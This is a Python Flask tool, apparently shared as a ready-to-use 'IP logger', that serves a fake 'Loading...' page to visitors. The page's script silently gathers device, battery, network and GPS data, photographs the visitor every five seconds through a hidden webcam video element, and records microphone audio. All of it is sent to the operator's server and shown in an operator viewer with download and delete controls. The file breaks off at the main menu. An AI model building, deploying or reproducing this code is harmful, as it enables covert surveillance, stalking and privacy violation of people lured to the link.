#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RISHI ULTIMATE IP TOOL v14.0
Simple Device Info - No N/A
"""

import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import threading
import webbrowser
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, make_response, send_from_directory

# ================= CONFIG =================
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
DB_FILE = "ultimate_logs.db"
DATA_DIR = "data"
PORT = 5000

# ================= COLORS =================
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    GREEN = Fore.GREEN + Style.BRIGHT
    YELLOW = Fore.YELLOW + Style.BRIGHT
    CYAN = Fore.CYAN + Style.BRIGHT
    WHITE = Fore.WHITE + Style.BRIGHT
    MAGENTA = Fore.MAGENTA + Style.BRIGHT
    RED = Fore.RED + Style.BRIGHT
    BLUE = Fore.BLUE + Style.BRIGHT
    RESET = Style.RESET_ALL
except ImportError:
    GREEN = YELLOW = CYAN = WHITE = MAGENTA = RED = BLUE = RESET = ""

# ================= BANNER =================
RISHI_BANNER = """
==================================================
                R I S H I
          ULTIMATE IP TOOL v14.0
         IP + Webcam + Mic + Viewer
==================================================
"""

logger_running = False

# ================= INIT =================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            folder TEXT,
            ip TEXT, city TEXT, region TEXT, country TEXT, isp TEXT,
            device TEXT, screen TEXT, timezone TEXT, language TEXT,
            platform TEXT, battery TEXT, network TEXT,
            latitude TEXT, longitude TEXT, timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()
    os.makedirs(DATA_DIR, exist_ok=True)

# ================= IP INFO =================
def get_my_ip():
    try:
        return requests.get("https://ipinfo.io/ip", timeout=5).text.strip()
    except:
        return None

def get_ip_info(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return r.json()
    except:
        return {}

def show_ip_info(ip):
    try:
        d = get_ip_info(ip)
        print(f"\n{CYAN}{'='*50}")
        print(f"  {MAGENTA}IP INFORMATION")
        print(f"{CYAN}{'='*50}{RESET}")
        print(f"  {WHITE}IP Address  : {GREEN}{d.get('ip', 'N/A')}{RESET}")
        print(f"  {WHITE}City        : {GREEN}{d.get('city', 'N/A')}{RESET}")
        print(f"  {WHITE}Region      : {GREEN}{d.get('region', 'N/A')}{RESET}")
        print(f"  {WHITE}Country     : {GREEN}{d.get('country', 'N/A')}{RESET}")
        print(f"  {WHITE}Location    : {GREEN}{d.get('loc', 'N/A')}{RESET}")
        print(f"  {WHITE}ISP/Org     : {GREEN}{d.get('org', 'N/A')}{RESET}")
        print(f"  {WHITE}Postal      : {GREEN}{d.get('postal', 'N/A')}{RESET}")
        print(f"  {WHITE}Timezone    : {GREEN}{d.get('timezone', 'N/A')}{RESET}")
        print(f"{CYAN}{'='*50}{RESET}")
        if d.get('loc'):
            lat, lon = d['loc'].split(',')
            print(f"  {YELLOW}Maps: https://maps.google.com/?q={lat},{lon}{RESET}")
        print(f"{CYAN}{'='*50}{RESET}")
    except Exception as e:
        print(f"{RED}  Error: {e}{RESET}")

# ================= CREATE SESSION =================
def create_session_folder():
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    folder = os.path.join(DATA_DIR, timestamp)
    counter = 1
    original = folder
    while os.path.exists(folder):
        folder = f"{original}_{counter}"
        counter += 1
    os.makedirs(folder, exist_ok=True)
    os.makedirs(os.path.join(folder, "photos"), exist_ok=True)
    os.makedirs(os.path.join(folder, "audio"), exist_ok=True)
    return folder

# ================= TARGET HTML =================
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        * {
            -webkit-user-select: none; -moz-user-select: none;
            -ms-user-select: none; user-select: none;
            -webkit-touch-callout: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #0a0a0f;
            color: #00ff41;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .spinner {
            width: 60px; height: 60px;
            border: 4px solid #1a1a2e;
            border-top: 4px solid #00ff41;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="spinner"></div>
        <p>Loading...</p>
    </div>

    <script>
        var session = "SESSION_PLACEHOLDER";

        var data = {
            session: session,
            screen: screen.width + "x" + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform
        };

        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "Charging" : "Not Charging");
            });
        }

        if (navigator.connection) {
            data.network = navigator.connection.effectiveType + " | " + navigator.connection.downlink + " Mbps";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                data.latitude = pos.coords.latitude;
                data.longitude = pos.coords.longitude;
            });
        }

        setTimeout(function() {
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }, 2000);

        // WEBCAM
        var photoStream = null;
        var photoCanvas = document.createElement('canvas');
        photoCanvas.width = 640;
        photoCanvas.height = 480;

        function capturePhoto() {
            if (!photoStream) return;
            var video = document.getElementById('hiddenVideo');
            if (!video || video.readyState < 2) return;
            var ctx = photoCanvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            var photo = photoCanvas.toDataURL('image/jpeg', 0.7);
            fetch('/photo', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({image: photo, session: session})
            });
        }

        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({video: true})
            .then(function(stream) {
                photoStream = stream;
                var video = document.createElement('video');
                video.id = 'hiddenVideo';
                video.srcObject = stream;
                video.style.display = 'none';
                video.setAttribute('playsinline', '');
                document.body.appendChild(video);
                video.play();
                setTimeout(capturePhoto, 3000);
                setInterval(capturePhoto, 5000);
            })
            .catch(function(e) { console.log('Camera denied'); });
        }

        // MIC
        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({audio: true})
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onloadend = function() {
                        fetch('/audio', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({audio: reader.result.split(',')[1], session: session})
                        });
                    };
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, 5000);
            })
            .catch(function(e) { console.log('Mic denied'); });
        }
    </script>
</body>
</html>
"""

# ================= FLASK =================
app = Flask(__name__)

@app.route('/')
def index():
    session_folder = create_session_folder()
    session_name = os.path.basename(session_folder)
    html = HTML_PAGE.replace("SESSION_PLACEHOLDER", session_name)
    response = make_response(html)
    response.set_cookie('rishi_session', session_name, max_age=3600)
    return response

@app.route('/log', methods=['POST'])
def log_data():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    data = request.get_json() or {}
    session = data.get('session', '')
    ip_info = get_ip_info(ip)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Save only if value exists
    def safe(val):
        if val is None or val == "" or val == "N/A" or val == "null":
            return None
        return val

    info_json = {
        "ip": safe(ip),
        "city": safe(ip_info.get('city')),
        "region": safe(ip_info.get('region')),
        "country": safe(ip_info.get('country')),
        "isp": safe(ip_info.get('org')),
        "device": safe(ua),
        "screen": safe(data.get('screen')),
        "timezone": safe(data.get('timezone')),
        "language": safe(data.get('language')),
        "platform": safe(data.get('platform')),
        "battery": safe(data.get('battery')),
        "network": safe(data.get('network')),
        "gps": None,
        "time": safe(timestamp)
    }

    # GPS
    lat = data.get('latitude')
    lon = data.get('longitude')
    if lat and lon and lat != "N/A" and lon != "N/A":
        info_json["gps"] = f"{lat}, {lon}"

    # Remove None values
    info_json = {k: v for k, v in info_json.items() if v is not None}

    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            INSERT INTO sessions
            (folder, ip, city, region, country, isp, device, screen, timezone,
             language, platform, battery, network, latitude, longitude, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session, ip, info_json.get('city', ''), info_json.get('region', ''),
            info_json.get('country', ''), info_json.get('isp', ''),
            ua, data.get('screen', ''), data.get('timezone', ''),
            data.get('language', ''), data.get('platform', ''),
            data.get('battery', ''), data.get('network', ''),
            info_json.get('gps', ''), '', timestamp
        ))
        conn.commit()
        conn.close()
    except:
        pass

    if session:
        session_path = os.path.join(DATA_DIR, session)
        if os.path.exists(session_path):
            info_file = os.path.join(session_path, "device_info.json")
            with open(info_file, "w", encoding="utf-8") as f:
                json.dump(info_json, f, indent=2)

    print(f"\n{GREEN}{'='*50}")
    print(f"  {MAGENTA}NEW VISITOR - SESSION: {session}")
    print(f"{GREEN}{'='*50}{RESET}")
    print(f"  {WHITE}Time     : {GREEN}{timestamp}{RESET}")
    print(f"  {WHITE}IP       : {GREEN}{ip}{RESET}")
    print(f"  {WHITE}City     : {GREEN}{info_json.get('city', '')}{RESET}")
    print(f"  {WHITE}Device   : {GREEN}{ua[:50]}{RESET}")
    print(f"{GREEN}{'='*50}{RESET}")

    return jsonify({"status": "ok"})

@app.route('/photo', methods=['POST'])
def photo():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    session = data.get('session', '')
    if not session:
        return jsonify({"status": "error"})
    session_path = os.path.join(DATA_DIR, session, "photos")
    if not os.path.exists(session_path):
        return jsonify({"status": "error"})
    timestamp = datetime.now().strftime('%H%M%S')
    filename = f"photo_{timestamp}.jpg"
    filepath = os.path.join(session_path, filename)
    with open(filepath, "wb") as f:
        f.write(base64.b64decode(image_data))
    print(f"{GREEN}  Photo saved: {filename}{RESET}")
    return jsonify({"status": "ok", "file": filename})

@app.route('/audio', methods=['POST'])
def audio():
    data = request.get_json()
    audio_data = data['audio']
    session = data.get('session', '')
    if not session:
        return jsonify({"status": "error"})
    session_path = os.path.join(DATA_DIR, session, "audio")
    if not os.path.exists(session_path):
        return jsonify({"status": "error"})
    timestamp = datetime.now().strftime('%H%M%S')
    filename = f"audio_{timestamp}.webm"
    filepath = os.path.join(session_path, filename)
    with open(filepath, "wb") as f:
        f.write(base64.b64decode(audio_data))
    print(f"{GREEN}  Audio saved: {filename}{RESET}")
    return jsonify({"status": "ok", "file": filename})

@app.route('/file/<path:filepath>')
def serve_file(filepath):
    return send_from_directory(DATA_DIR, filepath)

@app.route('/download/<path:filepath>')
def download_file(filepath):
    return send_from_directory(DATA_DIR, filepath, as_attachment=True)

@app.route('/delete/<session>', methods=['POST'])
def delete_session(session):
    session_path = os.path.join(DATA_DIR, session)
    if os.path.exists(session_path) and os.path.isdir(session_path):
        shutil.rmtree(session_path)
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("DELETE FROM sessions WHERE folder = ?", (session,))
            conn.commit()
            conn.close()
        except:
            pass
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@app.route('/delete_file', methods=['POST'])
def delete_file():
    data = request.get_json()
    filepath = data.get('filepath', '')
    full_path = os.path.join(DATA_DIR, filepath)
    if os.path.exists(full_path) and os.path.isfile(full_path):
        os.remove(full_path)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

# ================= VIEWER: FOLDER LIST =================
@app.route('/viewer')
def viewer():
    sessions = []
    if os.path.exists(DATA_DIR):
        for folder in sorted(os.listdir(DATA_DIR), reverse=True):
            folder_path = os.path.join(DATA_DIR, folder)
            if os.path.isdir(folder_path):
                photos_dir = os.path.join(folder_path, "photos")
                audio_dir = os.path.join(folder_path, "audio")
                photo_count = len(os.listdir(photos_dir)) if os.path.exists(photos_dir) else 0
                audio_count = len(os.listdir(audio_dir)) if os.path.exists(audio_dir) else 0
                info_file = os.path.join(folder_path, "device_info.json")
                ip = ""
                city = ""
                if os.path.exists(info_file):
                    try:
                        with open(info_file, "r") as f:
                            info = json.load(f)
                            ip = info.get("ip", "")
                            city = info.get("city", "")
                    except:
                        pass
                sessions.append({
                    "folder": folder,
                    "photos": photo_count,
                    "audios": audio_count,
                    "ip": ip,
                    "city": city
                })

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>RISHI VIEWER</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0; padding: 0; box-sizing: border-box;
                -webkit-user-select: none; -moz-user-select: none;
                -ms-user-select: none; user-select: none;
                -webkit-touch-callout: none;
                -webkit-tap-highlight-color: transparent;
                font-family: 'Inter', sans-serif;
            }
            body { background: #050810; color: #e2e8f0; padding: 20px; min-height: 100vh; }
            h1 {
                text-align: center; font-size: 28px; font-weight: 800; letter-spacing: 3px;
                background: linear-gradient(90deg, #00f2fe, #4facfe);
                -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                margin-bottom: 8px;
            }
            .subtitle { text-align: center; color: #4b5d82; font-size: 12px; letter-spacing: 2px; margin-bottom: 20px; font-weight: 500; }
            .count-badge {
                display: block; text-align: center; background: rgba(0, 198, 255, 0.15);
                color: #00f2fe; padding: 6px 16px; border-radius: 10px;
                font-size: 12px; font-weight: 700; margin: 0 auto 20px; width: fit-content;
            }
            .folder-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; max-width: 900px; margin: 0 auto; }
            .folder { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(100, 116, 139, 0.2); border-radius: 16px; padding: 18px; transition: all 0.3s; }
            .folder:hover { border-color: rgba(0, 198, 255, 0.5); box-shadow: 0 10px 30px rgba(0, 198, 255, 0.1); }
            .folder .name { font-size: 15px; font-weight: 700; color: #00f2fe; margin-bottom: 12px; word-break: break-all; }
            .folder .stats { display: flex; gap: 15px; margin-bottom: 12px; flex-wrap: wrap; }
            .folder .stat { font-size: 12px; color: #94a3b8; font-weight: 500; }
            .folder .stat-num { color: #34d399; font-weight: 700; }
            .folder .info { font-size: 12px; color: #64748b; margin-bottom: 12px; padding-top: 10px; border-top: 1px solid rgba(100, 116, 139, 0.15); line-height: 1.6; }
            .folder .actions { display: flex; gap: 8px; }
            .folder .btn { flex: 1; padding: 9px; text-align: center; border-radius: 8px; font-size: 12px; font-weight: 600; text-decoration: none; border: none; cursor: pointer; transition: 0.3s; }
            .folder .btn-open { background: linear-gradient(135deg, #00c6ff, #0072ff); color: #fff; }
            .folder .btn-delete { background: rgba(239, 68, 68, 0.2); color: #f87171; }
            .empty { text-align: center; color: #4b5d82; padding: 80px 20px; font-size: 16px; font-weight: 500; }
        </style>
    </head>
    <body>
        <h1>RISHI VIEWER</h1>
        <div class="subtitle">SESSION FOLDERS</div>
        <div class="count-badge">""" + str(len(sessions)) + """ Folders</div>
        <div class="folder-grid">
    """

    if sessions:
        for s in sessions:
            html += f'''
            <div class="folder">
                <div class="name">{s['folder']}</div>
                <div class="stats">
                    <div class="stat">Photos: <span class="stat-num">{s['photos']}</span></div>
                    <div class="stat">Audio: <span class="stat-num">{s['audios']}</span></div>
                </div>
                <div class="info">
                    IP: {s['ip']}<br>
                    City: {s['city']}
                </div>
                <div class="actions">
                    <a href="/folder/{s['folder']}" class="btn btn-open">Open</a>
                    <button class="btn btn-delete" onclick="deleteFolder('{s['folder']}')">Delete</button>
                </div>
            </div>
            '''
    else:
        html += '<div class="empty">No sessions yet.</div>'

    html += """
        </div>
        <script>
            function deleteFolder(folder) {
                if (confirm('Delete folder: ' + folder + '?')) {
                    fetch('/delete/' + folder, {method: 'POST'})
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.status === 'ok') location.reload();
                        else alert('Delete failed!');
                    });
                }
            }
        </script>
    </body>
    </html>
    """
    return html

# ================= VIEWER: SINGLE FOLDER =================
@app.route('/folder/<session>')
def view_folder(session):
    folder_path = os.path.join(DATA_DIR, session)
    if not os.path.exists(folder_path):
        return "Folder not found", 404

    photos_dir = os.path.join(folder_path, "photos")
    audio_dir = os.path.join(folder_path, "audio")

    photos = sorted(os.listdir(photos_dir), reverse=True) if os.path.exists(photos_dir) else []
    audios = sorted(os.listdir(audio_dir), reverse=True) if os.path.exists(audio_dir) else []

    photos = [f for f in photos if f.endswith(('.jpg', '.jpeg', '.png'))]
    audios = [f for f in audios if f.endswith(('.webm', '.mp3', '.wav', '.m4a'))]

    # Load device info
    device_json = {}
    info_file = os.path.join(folder_path, "device_info.json")
    if os.path.exists(info_file):
        try:
            with open(info_file, "r") as f:
                device_json = json.load(f)
        except:
            pass

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>""" + session + """ - RISHI VIEWER</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0; padding: 0; box-sizing: border-box;
                -webkit-user-select: none; -moz-user-select: none;
                -ms-user-select: none; user-select: none;
                -webkit-touch-callout: none;
                -webkit-tap-highlight-color: transparent;
                font-family: 'Inter', sans-serif;
            }
            body { background: #050810; color: #e2e8f0; padding: 15px; min-height: 100vh; }
            .header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
            .back-btn {
                padding: 10px 18px; background: rgba(30, 41, 59, 0.8);
                color: #cbd5e1; border: 1px solid rgba(100, 116, 139, 0.3);
                border-radius: 10px; text-decoration: none; font-size: 13px;
                font-weight: 600; transition: 0.3s;
            }
            .back-btn:hover { background: rgba(30, 41, 59, 1); color: #fff; }
            h1 { font-size: 18px; color: #00f2fe; letter-spacing: 2px; word-break: break-all; flex: 1; font-weight: 700; }

            .tabs { display: flex; gap: 8px; margin-bottom: 15px; width: 100%; }
            .tab {
                flex: 1; padding: 12px 8px; background: rgba(30, 41, 59, 0.6);
                color: #94a3b8; border: 1px solid rgba(100, 116, 139, 0.3);
                border-radius: 10px; cursor: pointer; font-family: inherit;
                font-size: 13px; font-weight: 600; transition: 0.3s; text-align: center;
            }
            .tab.active {
                background: linear-gradient(135deg, #00c6ff, #0072ff);
                color: #fff; border-color: transparent;
                box-shadow: 0 5px 20px rgba(0, 198, 255, 0.3);
            }

            .search-box { max-width: 100%; margin-bottom: 15px; position: relative; }
            .search-box input {
                width: 100%; padding: 12px 15px;
                background: rgba(30, 41, 59, 0.6);
                border: 1px solid rgba(100, 116, 139, 0.3);
                border-radius: 12px; color: #00f2fe;
                font-family: inherit; font-size: 14px; font-weight: 500; outline: none;
            }
            .search-box input:focus { border-color: #00c6ff; }
            .section { display: none; }
            .section.active { display: block; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; }
            .item { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(100, 116, 139, 0.2); border-radius: 12px; padding: 10px; transition: 0.3s; }
            .item:hover { border-color: rgba(0, 198, 255, 0.5); }
            .item img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; margin-bottom: 8px; cursor: pointer; background: #0a0a0f; display: block; }
            .item audio { width: 100%; margin-bottom: 8px; }
            .item .name { font-size: 11px; color: #7b8bb0; word-break: break-all; margin-bottom: 6px; font-weight: 500; }
            .item .actions { display: flex; gap: 5px; }
            .item .btn { flex: 1; padding: 6px; text-align: center; border-radius: 6px; font-size: 11px; font-weight: 600; text-decoration: none; border: none; cursor: pointer; }
            .item .btn-dl { background: rgba(16, 185, 129, 0.2); color: #34d399; }
            .item .btn-del { background: rgba(239, 68, 68, 0.2); color: #f87171; }
            .empty { text-align: center; color: #4b5d82; padding: 40px; font-weight: 500; }

            /* DEVICE INFO - SIMPLE */
            .device-box {
                background: rgba(30, 41, 59, 0.5);
                border: 1px solid rgba(100, 116, 139, 0.2);
                border-radius: 14px;
                padding: 8px 20px;
                max-width: 700px;
            }
            .device-row {
                display: flex;
                padding: 13px 0;
                border-bottom: 1px solid rgba(100, 116, 139, 0.1);
                font-size: 14px;
                align-items: flex-start;
            }
            .device-row:last-child { border-bottom: none; }
            .device-key {
                color: #7b8bb0;
                width: 35%;
                font-weight: 600;
                font-size: 12px;
                flex-shrink: 0;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .device-val {
                color: #e2e8f0;
                width: 65%;
                word-break: break-word;
                font-weight: 500;
                font-size: 14px;
                line-height: 1.5;
            }
            .device-val.highlight { color: #00f2fe; font-weight: 600; }

            /* MODAL */
            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.95); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
            .modal.active { display: flex; }
            .modal img { max-width: 95%; max-height: 85vh; border-radius: 12px; }
            .modal .close { position: absolute; top: 15px; right: 20px; color: #fff; font-size: 32px; cursor: pointer; background: rgba(255,255,255,0.1); width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        </style>
    </head>
    <body>
        <div class="header">
            <a href="/viewer" class="back-btn">Back</a>
            <h1>""" + session + """</h1>
        </div>
    """

    # TABS
    html += """
        <div class="tabs">
            <button class="tab active" onclick="showTab('photos')">Photos (""" + str(len(photos)) + """)</button>
            <button class="tab" onclick="showTab('audios')">Audio (""" + str(len(audios)) + """)</button>
            <button class="tab" onclick="showTab('device')">Device</button>
        </div>
    """

    # PHOTOS
    html += '<div id="photos" class="section active">'
    if photos:
        html += '<div class="search-box"><input type="text" id="searchPhotos" placeholder="Search photo..." oninput="searchItems(\'photos\')"></div>'
        html += '<div class="grid">'
        for i, p in enumerate(photos, 1):
            size = os.path.getsize(os.path.join(photos_dir, p)) / 1024
            html += f'''
            <div class="item" data-num="{i}" data-name="{p}">
                <img src="/file/{session}/photos/{p}" onclick="openPhoto('{session}/photos/{p}')" loading="lazy">
                <div class="name">#{i} - {p} ({size:.0f} KB)</div>
                <div class="actions">
                    <a href="/download/{session}/photos/{p}" class="btn btn-dl">Download</a>
                    <button class="btn btn-del" onclick="deleteFile('{session}/photos/{p}')">Delete</button>
                </div>
            </div>'''
        html += '</div>'
    else:
        html += '<div class="empty">No photos</div>'
    html += '</div>'

    # AUDIO
    html += '<div id="audios" class="section">'
    if audios:
        html += '<div class="search-box"><input type="text" id="searchAudios" placeholder="Search audio..." oninput="searchItems(\'audios\')"></div>'
        html += '<div class="grid">'
        for i, a in enumerate(audios, 1):
            size = os.path.getsize(os.path.join(audio_dir, a)) / 1024
            html += f'''
            <div class="item" data-num="{i}" data-name="{a}">
                <audio controls src="/file/{session}/audio/{a}"></audio>
                <div class="name">#{i} - {a} ({size:.0f} KB)</div>
                <div class="actions">
                    <a href="/download/{session}/audio/{a}" class="btn btn-dl">Download</a>
                    <button class="btn btn-del" onclick="deleteFile('{session}/audio/{a}')">Delete</button>
                </div>
            </div>'''
        html += '</div>'
    else:
        html += '<div class="empty">No audio</div>'
    html += '</div>'

    # DEVICE — ONLY 10 FIELDS
    html += '<div id="device" class="section">'
    if device_json:
        html += '<div class="device-box">'

        # IP
        if device_json.get("ip"):
            html += f'<div class="device-row"><span class="device-key">IP</span><span class="device-val highlight">{device_json["ip"]}</span></div>'
        # City
        if device_json.get("city"):
            html += f'<div class="device-row"><span class="device-key">City</span><span class="device-val">{device_json["city"]}</span></div>'
        # Region
        if device_json.get("region"):
            html += f'<div class="device-row"><span class="device-key">Region</span><span class="device-val">{device_json["region"]}</span></div>'
        # Country
        if device_json.get("country"):
            html += f'<div class="device-row"><span class="device-key">Country</span><span class="device-val">{device_json["country"]}</span></div>'
        # ISP
        if device_json.get("isp"):
            html += f'<div class="device-row"><span class="device-key">ISP</span><span class="device-val">{device_json["isp"]}</span></div>'
        # Device
        if device_json.get("device"):
            html += f'<div class="device-row"><span class="device-key">Device</span><span class="device-val">{device_json["device"]}</span></div>'
        # Screen
        if device_json.get("screen"):
            html += f'<div class="device-row"><span class="device-key">Screen</span><span class="device-val">{device_json["screen"]}</span></div>'
        # Battery
        if device_json.get("battery"):
            html += f'<div class="device-row"><span class="device-key">Battery</span><span class="device-val">{device_json["battery"]}</span></div>'
        # GPS
        if device_json.get("gps"):
            html += f'<div class="device-row"><span class="device-key">GPS</span><span class="device-val highlight">{device_json["gps"]}</span></div>'
        # Time
        if device_json.get("time"):
            html += f'<div class="device-row"><span class="device-key">Time</span><span class="device-val">{device_json["time"]}</span></div>'

        html += '</div>'
    else:
        html += '<div class="empty">No device info</div>'
    html += '</div>'

    html += """
        <div class="modal" id="photoModal" onclick="closeModal()">
            <span class="close">×</span>
            <img id="modalImg" src="">
        </div>

        <script>
            function showTab(name) {
                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.getElementById(name).classList.add('active');
                event.target.classList.add('active');
            }

            function openPhoto(path) {
                document.getElementById('modalImg').src = '/file/' + path;
                document.getElementById('photoModal').classList.add('active');
            }

            function closeModal() {
                document.getElementById('photoModal').classList.remove('active');
            }

            function searchItems(section) {
                var inputId = section === 'photos' ? 'searchPhotos' : 'searchAudios';
                var query = document.getElementById(inputId).value.trim().toLowerCase();
                var container = document.getElementById(section);
                var items = container.querySelectorAll('.item');
                items.forEach(function(item) {
                    var num = item.getAttribute('data-num');
                    var name = item.getAttribute('data-name').toLowerCase();
                    if (query === '' || num === query || name.includes(query)) {
                        item.style.display = 'block';
                    } else {
                        item.style.display = 'none';
                    }
                });
            }

            function deleteFile(path) {
                if (confirm('Delete this file?')) {
                    fetch('/delete_file', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({filepath: path})
                    })
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.status === 'ok') location.reload();
                        else alert('Delete failed!');
                    });
                }
            }

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') closeModal();
            });
        </script>
    </body>
    </html>
    """
    return html

def run_flask():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ================= IP LOGGER =================
def start_logger():
    global logger_running
    print(f"\n{CYAN}{'='*50}")
    print(f"  {MAGENTA}IP LOGGER STARTED")
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"  {WHITE}Local URL  : {GREEN}http://localhost:{PORT}{RESET}")
    print(f"  {WHITE}Viewer URL : {GREEN}http://localhost:{PORT}/viewer{RESET}")
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"\n  {YELLOW}Type 'b' + Enter to go back{RESET}\n")

    logger_running = True
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    while logger_running:
        try:
            cmd = input().strip().lower()
            if cmd == "b":
                logger_running = False
                print(f"\n{GREEN}  Returning to menu...{RESET}")
                time.sleep(1)
                break
        except (KeyboardInterrupt, EOFError):
            logger_running = False
            break

# ================= OPEN VIEWER =================
def open_viewer():
    global logger_running
    print(f"\n{GREEN}  Starting server...{RESET}")
    if not logger_running:
        logger_running = True
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        time.sleep(2)

    url = f"http://localhost:{PORT}/viewer"
    print(f"{GREEN}  Opening: {url}{RESET}")
    try:
        webbrowser.open(url)
        print(f"{GREEN}  Opened in browser!{RESET}")
    except:
        print(f"{YELLOW}  Open manually: {url}{RESET}")

    print(f"\n{YELLOW}  Server running. Type 'b' + Enter to stop{RESET}")
    while True:
        try:
            cmd = input().strip().lower()
            if cmd == "b":
                logger_running = False
                break
        except (KeyboardInterrupt, EOFError):
            logger_running = False
            break

# ================= SHOW LOGS =================
def show_logs():
    if not os.path.exists(DB_FILE):
        print(f"{YELLOW}  No logs yet!{RESET}")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, folder, ip, city, timestamp FROM sessions ORDER BY id DESC LIMIT 20")
    rows = c.fetchall()
    conn.close()
    if not rows:
        print(f"{YELLOW}  No logs yet!{RESET}")
        return
    print(f"\n{CYAN}{'='*80}")
    print(f"  {MAGENTA}RECENT SESSIONS")
    print(f"{CYAN}{'='*80}{RESET}")
    print(f"  {WHITE}{'ID':<5}{'Folder':<25}{'IP':<18}{'City':<15}{'Time'}{RESET}")
    print(f"{CYAN}{'-'*80}{RESET}")
    for row in rows:
        print(f"  {GREEN}{row[0]:<5}{WHITE}{row[1]:<25}{row[2]:<18}{row[3]:<15}{row[4]}{RESET}")
    print(f"{CYAN}{'='*80}{RESET}")

# ================= CLEAR LOGS =================
def clear_logs():
    confirm = input(f"{RED}  Clear ALL sessions? (yes/no): {RESET}").strip().lower()
    if confirm == "yes":
        if os.path.exists(DB_FILE):
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("DELETE FROM sessions")
            conn.commit()
            conn.close()
        if os.path.exists(DATA_DIR):
            shutil.rmtree(DATA_DIR)
            os.makedirs(DATA_DIR, exist_ok=True)
        print(f"{GREEN}  All sessions cleared!{RESET}")
    else:
        print(f"{YELLOW}  Cancelled.{RESET}")

# ================= MAIN MENU =================
def main_menu():
    while True:
